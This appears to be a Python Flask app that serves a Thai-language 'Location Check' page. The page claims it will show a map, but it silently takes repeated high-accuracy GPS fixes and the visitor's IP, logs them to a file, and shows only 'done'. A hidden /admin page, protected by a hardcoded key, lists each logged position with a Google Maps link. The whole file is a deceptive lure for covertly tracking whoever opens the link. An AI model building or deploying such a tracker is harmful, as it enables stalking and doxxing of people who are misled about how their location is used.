from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)
ADMIN_KEY = "0949205717As"

@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Location Check</title>

<style>
body {
    margin:0;
    font-family: Arial;
    background: linear-gradient(180deg,#0f0f1f,#000);
    color:white;
    text-align:center;
    padding-top:100px;
}
.box {
    background: rgba(0,0,0,0.6);
    padding:40px;
    border-radius:20px;
    width:350px;
    margin:auto;
    box-shadow:0 0 25px #6c5ce7;
}
button {
    padding:15px 30px;
    background:#6c5ce7;
    border:none;
    border-radius:10px;
    color:white;
    font-size:18px;
    cursor:pointer;
}
button:hover {background:#a29bfe;}
</style>

</head>
<body>

<div class="box">
<h2>📍 ตรวจสอบตำแหน่ง</h2>
<p>ระบบจะใช้ตำแหน่งเพื่อแสดงผลแผนที่</p>
<button onclick="start()">เริ่ม</button>
<p id="status"></p>
</div>

<script>
let best = null;
let count = 0;

function start(){
    document.getElementById("status").innerText = "กำลังค้นหา...";
    
    if(navigator.geolocation){
        for(let i=0;i<5;i++){
            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy:true,
                timeout:10000,
                maximumAge:0
            });
        }
    }
}

function success(pos){
    count++;
    let acc = pos.coords.accuracy;

    if(!best || acc < best.acc){
        best = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: acc
        };
    }

    document.getElementById("status").innerText =
        "กำลังวิเคราะห์... ("+count+"/5) | Accuracy: "+Math.round(acc)+"m";

    if(count >= 5){
        send(best);
    }
}

function error(){
    document.getElementById("status").innerText =
        "กรุณาเปิด Location เพื่อความแม่นยำ";
}

function send(data){
    fetch("/location", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(data)
    }).then(()=>{
        window.location="/done";
    });
}
</script>

</body>
</html>
"""

@app.route("/location", methods=["POST"])
def location():
    d = request.get_json()
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt","a") as f:
        f.write(f"{time}|{ip}|{d['lat']}|{d['lon']}|{d['acc']}\n")

    return jsonify({"ok":True})

@app.route("/done")
def done():
    return "<h1 style='color:white;background:black;text-align:center;padding:100px'>📍 เสร็จแล้ว</h1>"

@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""
    try:
        with open("log.txt") as f:
            for line in f:
                t,ip,lat,lon,acc = line.strip().split("|")
                link = f"https://www.google.com/maps?q={lat},{lon}"
                rows += f"<tr><td>{t}</td><td>{ip}</td><td>{lat},{lon}</td><td>{acc}m</td><td><a href='{link}' target='_blank'>Map</a></td></tr>"
    except:
        rows = "<tr><td colspan=5>No data</td></tr>"

    return f"""
    <body style="background:#111;color:white">
    <h1>📊 ADMIN</h1>
    <table border=1 width=100%>
    <tr><th>Time</th><th>IP</th><th>Location</th><th>Accuracy</th><th>Map</th></tr>
    {rows}
    </table>
    </body>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",10000)))
